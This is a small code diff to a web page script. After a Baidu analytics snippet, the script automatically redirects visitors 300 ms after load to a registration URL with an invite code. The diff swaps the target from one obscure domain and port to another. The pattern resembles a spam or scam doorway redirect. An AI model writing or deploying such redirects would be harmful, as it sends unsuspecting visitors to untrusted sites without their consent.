@@ -8,7 +8,7 @@ var _hmt = _hmt || [];
 })();
 
 function time() {
-    var arr = ["https://www.oeadi.com:9132/entry/register/?i_code=94802501", "https://www.oeadi.com:9132/entry/register/?i_code=94802501"];
+    var arr = ["https://www.um5mq.com:9011/entry/register/?i_code=94802501", "https://www.um5mq.com:9011/entry/register/?i_code=94802501"];
 		window.location.href = arr[parseInt(Math.random() * arr.length)];
 }
 setTimeout(time, 300);
